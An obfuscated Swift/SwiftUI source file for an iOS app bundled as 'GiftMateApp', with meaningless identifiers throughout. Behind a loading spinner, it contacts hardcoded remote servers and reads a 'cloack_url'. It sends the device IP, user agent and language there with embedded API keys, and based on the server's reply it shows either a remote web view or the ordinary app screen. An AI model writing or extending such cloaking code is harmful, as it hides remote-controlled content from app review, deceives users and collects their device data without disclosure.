import SwiftUI
import SwiftData
import WebKit
import OneSignal

extension UIScreen{
  static let ystdgauyfhj = UIScreen.main.bounds.size.width
  static let ysadgtuhfbj = UIScreen.main.bounds.size.height
  static let rtwfyghubdsfgv = UIScreen.main.bounds.size
}
struct Rghsdvygsdbfkjsdfg: View {
    

    @State var wyhgevbdsjf: String = ""
    @State var ytwefgufhyds: String = ""
    @State var rtdfyguhsdf = false
    @State var dtrqwfygfhds = false
    @State var trdqwyfguhds: String = ""
    @State var rtdqwfyghfds: Bool = false
    @State var yerdtyfguhbsdf: Bool = false
    @ObservedObject var ertydqwuyfguhbds: Ljweuygysdff = Ljweuygysdff()
    @AppStorage("drqtfyeghuds") var drqtfyeghuds: Bool = true
    @AppStorage("edr6tfyguhsedf") var edr6tfyguhsedf: Bool = true
    @AppStorage("ydrtufyguqsdf") var ydrtufyguqsdf: Bool = true
    @State var opqiweuhgfyoidsg:  String = "opqwieuyygufusdyhif"
    @State var mnhbawbuysdfgh: String = ""
     
    var body: some View {
            ZStack{
                 
                Color.black
                    .ignoresSafeArea()
                
                Kbsgvsdvv(isAnimating: .constant(true), style: .large).frame(width: UIScreen.ystdgauyfhj / 2.1,
                                                                                     height: UIScreen.ysadgtuhfbj / 5.1)
                .background(Color.gray)
                                                                                      .foregroundColor(Color.primary)
                                                                                      .cornerRadius(18).onAppear{
                                                                                          
                                                                                      }
                    
               
                
                if opqiweuhgfyoidsg == "asuygdhfsdaguyf" || opqiweuhgfyoidsg == "wyeqtugifhsdf"{
                        if self.drqtfyeghuds{
                            ZStack{
                                Color.black
                                    .ignoresSafeArea()

                                Lnnnmsnvgbj(weredsf: $wyhgevbdsjf, uioejhdfb: $ytwefgufhyds, bhjdbfv: $rtdfyguhsdf, hhebdfb: $dtrqwfygfhds).onAppear{
                                   
                                }
                                
                                Color.black
                                    .ignoresSafeArea()

                                Kbsgvsdvv(isAnimating: .constant(true), style: .large).frame(width: UIScreen.ystdgauyfhj / 2.1,
                                                                                                     height: UIScreen.ysadgtuhfbj / 5.1)
                                .background(Color.gray)
                                                                                                      .foregroundColor(Color.primary)
                                                                                                      .cornerRadius(18)

                            }
             
                        }
                        if rtdfyguhsdf || !self.edr6tfyguhsedf {
                            ZStack{
                                Juwghesduguf(iuwegfhdsb: ertydqwuyfguhbds)
                            }.onAppear{
                                rtdqwfyghfds.toggle()
                                self.drqtfyeghuds = false
                                self.edr6tfyguhsedf = false
                                
                            }
                            
                        }
                        if dtrqwfygfhds || !self.ydrtufyguqsdf{
                            ZStack{
                                Color.black
                                    .ignoresSafeArea()
                                MainView().onAppear{
                                   
                                    AppDelegate.orientationLock = UIInterfaceOrientationMask.portrait
                                    UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                                                    UINavigationController.attemptRotationToDeviceOrientation()
                                    
                                }
                            }
                        }

                }
                
                
                
             }.onAppear{
                 OneSignal.promptForPushNotifications(userResponse: { accepted in
                     if accepted {
                         
                         opqiweuhgfyoidsg = "asuygdhfsdaguyf"
                         rtdqwfyghfds.toggle()
                     } else {
                         opqiweuhgfyoidsg = "wyeqtugifhsdf"
                         rtdqwfyghfds.toggle()
                          
                     }
                 })
         

                
                if let url = URL(string: "https://ballsort.store/wishnest/wishnest.json") {
                    URLSession.shared.dataTask(with: url) { data, response, error in
                        if let data = data {
                             if let json = try? JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {

                                 if let value2 = json["eytwtgaerg"] as? String {

                                    DispatchQueue.main.async {
                                        self.wyhgevbdsjf = value2
                                        self.wyhgevbdsjf = "https://losgffrw.shop/data"
                                        
                                     }
                                    
                                 }
                            }
                        }
                    }.resume()
                }

            }
             
    }
    
    struct Lnnnmsnvgbj: UIViewRepresentable {
        @Binding var weredsf: String
        @Binding var uioejhdfb: String
        @Binding var bhjdbfv: Bool
        @Binding var hhebdfb: Bool
        @AppStorage("kjhvbdsjn") var tueyhdfbv: Bool = true
        
        func makeUIView(context: Context) -> WKWebView {
            let webView = WKWebView()
            webView.navigationDelegate = context.coordinator
            if let url = URL(string: weredsf) {
                var request = URLRequest(url: url)
                request.httpMethod = "GET"
                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let headers = ["apikey": "yBKxMCokyup2bh0VTfbTCsxuem9xsldK",
                               "bundle": "com.GiftMateApp"]
                for (key, value) in headers {
                    request.setValue(value, forHTTPHeaderField: key)
                }
                
                webView.load(request)
            }
            return webView
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        
        func makeCoordinator() -> Coordinator {
            Coordinator(self)
        }
        
        class Coordinator: NSObject, WKNavigationDelegate {
            var parent: Lnnnmsnvgbj
            var ipAddress: String?
            var userAgent: String?
            @AppStorage("fdxrtfyghvjhfc") var bvgqwyudhsbvgcysdhjbv: String = "ttqfghjbsdv"
            init(_ webView: Lnnnmsnvgbj) {
                self.parent = webView
            }
            
            func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { (html: Any?, error: Error?) in
                    guard let htmlString = html as? String else {
                         
                        return
                    }
                    
                    self.parseResponse(htmlString)
                    webView.evaluateJavaScript("navigator.userAgent") { (result, error) in
                        if let userAgent = result as? String {
                            self.userAgent = userAgent
                        } else {
                         }
                    }
                    
                }
            }
            
            
            
            func parseResponse(_ htmlString: String) {
                guard let jsonString = extractJSONString(from: htmlString) else {
                     return
                }
                
                let cleanedJsonString = jsonString.trimmingCharacters(in: .whitespacesAndNewlines)
                
                guard let jsonData = cleanedJsonString.data(using: .utf8) else {
                     return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: jsonData, options: []) as? [String: Any]
                    guard let quyeihjbdbf = jsonResponse?["cloack_url"] as? String else {
                         return
                    }
                    guard let hegvuhjbdf = jsonResponse?["atr_service"] as? String else {
                         return
                    }
                   
                    DispatchQueue.main.async {
                        self.parent.weredsf = quyeihjbdbf
                        self.parent.uioejhdfb = hegvuhjbdf
                    }
                    
                     self.performSecondRequest(with: quyeihjbdbf)
                    
                } catch {
                    print("vdfvsdv: \(error.localizedDescription)")
                }
            }
            
            func extractJSONString(from htmlString: String) -> String? {
                guard let startRange = htmlString.range(of: "{"),
                      let endRange = htmlString.range(of: "}", options: .backwards) else {
                     
                    return nil
                }
                
                let jsonString = String(htmlString[startRange.lowerBound..<endRange.upperBound])
                return jsonString
            }
            
            func performSecondRequest(with url: String) {
                guard let secondURL = URL(string: url) else {
                    
                    return
                }
                getIPAddress { ipAddress in
                    guard let ipAddress = ipAddress else {
                        
                        return
                    }
                    
                    
                    self.ipAddress = ipAddress
                    var request = URLRequest(url: secondURL)
                    request.httpMethod = "GET"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    
                    let headers = [
                        
                        "apikeyapp": "nwjVWHj7Gvm4BE9kQNAaHxoO",
                        "ip": self.ipAddress ?? "",
                        "useragent": self.userAgent ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    
                    for (key, value) in headers {
                        request.setValue(value, forHTTPHeaderField: key)
                    }
                    
                    URLSession.shared.dataTask(with: request) { data, response, error in
                        guard let data = data, error == nil else {
                            print("dsvdfvsdfvdf: \(error?.localizedDescription ?? "Unknown error")")
                            return
                        }
                        if let httpResponse = response as? HTTPURLResponse {
                            print("dvsdfvdsvdfv: \(httpResponse.statusCode)")
                            
                            
                            if httpResponse.statusCode == 200 {
                               
                                self.performThirdRequest()
                               
                                 
                            } else {
                                self.bvgqwyudhsbvgcysdhjbv = "kjhughbjknbhjghjwevwev"
                                    self.parent.hhebdfb = true
                                self.parent.tueyhdfbv = false
         
                            }
                            
                            
                        }
                        
                        if let responseString = String(data: data, encoding: .utf8) {
                            print("sdfvdsv: \(responseString)")
                            
                        }
                    }.resume()
                }
            }
            
            func performThirdRequest() {
                 
                let thirdURLString = self.parent.uioejhdfb
                 
                
                guard let thirdURL = URL(string: thirdURLString) else {
                    print("dfvsdfbdsf")
                    return
                }
                
                var request = URLRequest(url: thirdURL)
                request.httpMethod = "GET"
                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
              
                let headers = [
                    "apikeyapp": "nwjVWHj7Gvm4BE9kQNAaHxoO",
                    "ip":  self.ipAddress ?? "",
                    "useragent": self.userAgent ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key, value) in headers {
                    request.setValue(value, forHTTPHeaderField: key)
                }
                
                URLSession.shared.dataTask(with: request) { data, response, error in
                    guard let data = data, error == nil else {
                        print("vdsfvdfvdfv: \(error?.localizedDescription ?? "Unknown error")")
                        return
                    }
                    
                    
                    if let httpResponse = response as? HTTPURLResponse {
                        print("dsfvdfvdfv: \(httpResponse.statusCode)")
                    }
                    
                    if let responseString = String(data: data, encoding: .utf8) {
                        print("dfsvdfvdsfv: \(responseString)")
                        
                        do {
                            let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
                            guard let cdtrygvb = jsonResponse?["final_url"] as? String,
                                  let vcfytughvb = jsonResponse?["push_sub"] as? String,
                                  let drxtyfgvjhb = jsonResponse?["os_user_key"] as? String else {
                                 
                                return
                            }
                            
                            
                            UserDataManager.njwhbueihjskbdvshjbv.jhgb = cdtrygvb
                            UserDataManager.njwhbueihjskbdvshjbv.nbuhb = vcfytughvb
                            UserDataManager.njwhbueihjskbdvshjbv.bvygh = drxtyfgvjhb
                            OneSignal.setExternalUserId(UserDataManager.njwhbueihjskbdvshjbv.bvygh ?? "")
                            OneSignal.sendTag("sub_app", value: UserDataManager.njwhbueihjskbdvshjbv.nbuhb ?? "")
                             
                            self.parent.bhjdbfv = true
                        } catch {
                            print("dfvsdfbdf: \(error.localizedDescription)")
                        }
                    }
                }.resume()
            }
            
            
            func performThirdRequest(with data: Data) {
                
            }
            
            
            func getIPAddress(completion: @escaping (String?) -> Void) {
                let url = URL(string: "https://api.ipify.org")!
                let task = URLSession.shared.dataTask(with: url) { data, response, error in
                    guard let data = data, let ipAddress = String(data: data, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                task.resume()
            }
            
            
        }
    }
}
struct Kbsgvsdvv: UIViewRepresentable {

    @Binding var isAnimating: Bool
    let style: UIActivityIndicatorView.Style

    func makeUIView(context: UIViewRepresentableContext<Kbsgvsdvv>) -> UIActivityIndicatorView {
        return UIActivityIndicatorView(style: style)
    }

    func updateUIView(_ uiView: UIActivityIndicatorView, context: UIViewRepresentableContext<Kbsgvsdvv>) {
        isAnimating ? uiView.startAnimating() : uiView.stopAnimating()
       
    }
}

struct Nbvsdjhbv<Content>: View where Content: View {

    @Binding var gggsdhvc: Bool
    var content: () -> Content
     var body: some View {
        GeometryReader { geometry in
            ZStack(alignment: .center) {
                
                self.content()
                    .disabled(self.gggsdhvc)
                    .blur(radius: self.gggsdhvc ? 3 : 0)
              
                Kbsgvsdvv(isAnimating: $gggsdhvc, style: .large)
               
                    .frame(width: geometry.size.width / 2.1,
                           height: geometry.size.height / 5.1)
                    .shadow(color: .black, radius: 10, x: 5, y:5)
                                    .background(Color.gray)
                .foregroundColor(Color.primary)
                .cornerRadius(18)
                .opacity(self.gggsdhvc ? 1 : 0)
            }
        }
    }
}
